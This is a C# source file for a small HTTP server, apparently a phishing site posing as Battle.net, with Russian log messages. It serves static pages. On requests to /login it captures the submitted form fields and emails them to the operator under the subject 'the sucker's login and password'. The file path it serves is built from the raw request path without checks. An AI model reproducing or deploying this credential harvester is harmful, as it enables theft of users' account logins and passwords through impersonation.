using System.Net;
using BattleNetServer.Configuration;
using Newtonsoft.Json;

namespace BattleNetServer;

class Server
{
    private static readonly CancellationTokenSource cancellationTokenSource = new();
    private static readonly Lazy<Server> lazy = new Lazy<Server>(() => new Server());
    private static readonly HttpListener server = new HttpListener();
    
    private Server()
    {
        
    }

    public static Server Instance => lazy.Value;

    public async Task RunAsync()
    {
        var token = cancellationTokenSource.Token;
        Task.Run(() => StartServer(token));
        Task.Run(StopServerOnCommand);
    }

    private async Task StartServer(CancellationToken token)
    {
        var isSuccess = await InitializeServer();
        Console.WriteLine(isSuccess);
        var appConfig = await GetConfigurationAsync();
        if (isSuccess)
        {
            if (token.IsCancellationRequested)
                return;

            while (true)
            {
                if (token.IsCancellationRequested)
                    return;
            
                var context = await server.GetContextAsync();
                using var response = context.Response;
                var request = context.Request;

                var requestPath = request.Url!.AbsolutePath;
                var pathFile = Path.Combine(appConfig.StaticFile, requestPath.Trim('/'));
                if (requestPath.EndsWith('/'))
                {
                    var indexPath = Path.Combine(pathFile, "index.html");
                    var buffer = await File.ReadAllBytesAsync(indexPath, token);
                    response.ContentLength64 = buffer.Length;
                    await response.OutputStream.WriteAsync(buffer, 0, buffer.Length, token);
                }
                else if (requestPath == "/login")
                {
                    await using var body = request.InputStream;
                    using var streamReader = new StreamReader(body);
                    var userData = await streamReader.ReadToEndAsync(token);
                    var buffer = userData.Split('&');
                    var isSend = await MessageSender.SendEmailAsync(buffer[0], buffer[1], "Логин и пароль лоха");
                    if(isSend)
                        Console.WriteLine("Электронное письмо было отправлено.");
                }
                else
                {
                    if (File.Exists(pathFile))
                    {
                        response.ContentType = GetContentType(pathFile);
                        var buffer = await File.ReadAllBytesAsync(pathFile, token);
                        response.ContentLength64 = buffer.Length;
                        await response.OutputStream.WriteAsync(buffer, 0, buffer.Length, token);
                    }
                    else
                    {
                        Console.WriteLine($"Путь {pathFile} не найден.");
                    }
                }
            } 
            //server.Close();
        }
        else
        {
            Console.WriteLine("Ошибки с конфигурацией сервера.");
        }
    }

    private string GetContentType(string filePath)
    {
        string extension = Path.GetExtension(filePath).ToLower();
        switch (extension)
        {
            case ".html":
                return "text/html";
            case ".css":
                return "text/css";
            case ".jpg":
                return "image/jpeg";
            case ".png":
                return "image/png";
            case ".svg":
                return "image/svg+xml";
            default:
                return "text/html";
        }
    }

    private async Task StopServerOnCommand()
    {
        while (true)
        {
            if (Console.ReadLine() != "stop") continue;
            cancellationTokenSource.Cancel();
            await Task.Delay(4000);
            break;
        }
    }


    private async Task<bool> InitializeServer()
    {
        var config = await GetConfigurationAsync();
        CreateStaticFileDirectory(config);
        server.Prefixes.Add($"{config.Address}:{config.Port}/");
        server.Start();
        Console.WriteLine($"Сервер был запущен по адресу: {config.Address}:{config.Port}/");
        return true;
    }


    private async Task<AppSettingsConfig?> GetConfigurationAsync()
    {
        try
        {
            var json = await File.OpenText("appsettings.json").ReadToEndAsync();
            return JsonConvert.DeserializeObject<AppSettingsConfig>(json);
        }
        catch (Exception e)
        {
            Console.WriteLine("Файл appsettings.json не был найден.");
            throw;
        }
    }

    private void CreateStaticFileDirectory(AppSettingsConfig config)
    {
        if (Directory.Exists(config.StaticFile)) return;
        if (config.StaticFile != null)
            Directory.CreateDirectory(config.StaticFile);
    }
}